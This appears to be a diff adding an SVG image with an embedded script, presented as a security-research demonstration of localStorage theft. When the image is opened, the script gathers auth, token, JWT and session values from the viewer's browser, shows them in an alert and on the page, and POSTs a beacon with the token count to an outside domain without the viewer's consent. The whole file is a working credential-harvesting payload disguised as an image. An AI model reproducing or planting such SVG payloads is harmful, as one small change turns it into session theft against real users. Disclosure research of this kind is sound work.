@@ -1,0 +1,118 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%">
+  <foreignObject width="100%" height="100%">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+      <head>
+        <style>
+          * { margin: 0; padding: 0; box-sizing: border-box; }
+          body { background: #0a0a0a; font-family: 'Courier New', monospace; color: #00ff00; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+          .container { max-width: 800px; padding: 40px; text-align: center; }
+          h1 { font-size: 28px; margin-bottom: 20px; text-shadow: 0 0 10px #00ff00; }
+          .warning { background: rgba(255,0,0,0.2); border: 2px solid #ff0000; padding: 20px; margin: 20px 0; border-radius: 8px; }
+          .warning h2 { color: #ff0000; text-shadow: 0 0 10px #ff0000; margin-bottom: 10px; }
+          .found { background: rgba(0,255,0,0.1); border: 2px solid #00ff00; padding: 20px; margin: 20px 0; border-radius: 8px; text-align: left; }
+          .found h3 { margin-bottom: 15px; }
+          .token-item { padding: 10px; margin: 5px 0; background: rgba(0,0,0,0.5); border-radius: 4px; font-size: 12px; word-break: break-all; }
+          .token-name { color: #ffff00; }
+          .token-value { color: #888; }
+          .message { margin-top: 30px; font-size: 14px; color: #888; line-height: 1.6; }
+          .cta { display: inline-block; margin-top: 20px; padding: 15px 30px; border: 2px solid #00ff00; color: #00ff00; text-decoration: none; font-size: 16px; transition: all 0.3s; }
+          .cta:hover { background: rgba(0,255,0,0.2); }
+          .ping-status { margin-top: 20px; font-size: 12px; color: #666; }
+        </style>
+      </head>
+      <body>
+        <div class="container">
+          <h1>localStorage Access Demonstration</h1>
+
+          <div class="warning">
+            <h2>This SVG just accessed your localStorage</h2>
+            <p>Check the alert popup - those are YOUR tokens.</p>
+          </div>
+
+          <div class="found" id="found">
+            <h3>Tokens found:</h3>
+            <div id="tokens"></div>
+          </div>
+
+          <div class="message">
+            <p>Security research by <strong>@theonejvo</strong></p>
+            <p>A real attacker would have silently exfiltrated these.</p>
+          </div>
+
+          <a class="cta" href="https://x.com/theonejvo" target="_blank">Read the full research</a>
+
+          <div class="ping-status" id="ping-status">Sending anonymous ping...</div>
+        </div>
+
+        <script>
+          // Collect auth tokens from localStorage
+          var tokensDiv = document.getElementById('tokens');
+          var pingStatus = document.getElementById('ping-status');
+          var alertMessage = 'YOUR TOKENS (from localStorage):\n\n';
+          var foundCount = 0;
+
+          for (var i = 0; i &lt; localStorage.length; i++) {
+            var key = localStorage.key(i);
+            var value = localStorage.getItem(key);
+
+            if (key.toLowerCase().includes('auth') ||
+                key.toLowerCase().includes('token') ||
+                key.toLowerCase().includes('jwt') ||
+                key.toLowerCase().includes('session') ||
+                key.toLowerCase().includes('convex')) {
+
+              foundCount++;
+
+              // Show first 50 chars in alert
+              var preview = value ? value.substring(0, 80) + '...' : '(empty)';
+              alertMessage += key + ':\n' + preview + '\n\n';
+
+              // Also display on page
+              var item = document.createElementNS('http://www.w3.org/1999/xhtml', 'div');
+              item.setAttribute('class', 'token-item');
+              item.innerHTML = '<span class="token-name">' + key + '</span><br/>' +
+                '<span class="token-value">' + preview + '</span>';
+              tokensDiv.appendChild(item);
+            }
+          }
+
+          if (foundCount === 0) {
+            alertMessage = 'No auth tokens found.\n\nYou may not be logged in, or tokens are stored elsewhere.';
+            tokensDiv.innerHTML = '<p style="color:#888">No auth tokens found in localStorage</p>';
+          } else {
+            alertMessage += '\n---\nA malicious SVG would have sent these to an attacker server.\nThis demo only shows them to YOU.';
+          }
+
+          // Show the tokens in an alert popup
+          alert(alertMessage);
+
+          // Send anonymous ping - only count, no token data
+          try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://clawdhub-skill.com/log', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onreadystatechange = function() {
+              if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                  pingStatus.textContent = 'Ping sent. Token count: ' + foundCount + '. No actual tokens transmitted.';
+                  pingStatus.style.color = '#00ff00';
+                } else {
+                  pingStatus.textContent = 'Ping failed, but localStorage was still accessed.';
+                  pingStatus.style.color = '#ff8800';
+                }
+              }
+            };
+            xhr.send(JSON.stringify({
+              ping: '1',
+              source: 'svg-localstorage-poc',
+              tokensFound: foundCount
+            }));
+          } catch(e) {
+            pingStatus.textContent = 'Ping blocked, but localStorage was still accessed.';
+          }
+        </script>
+      </body>
+    </html>
+  </foreignObject>
+</svg>
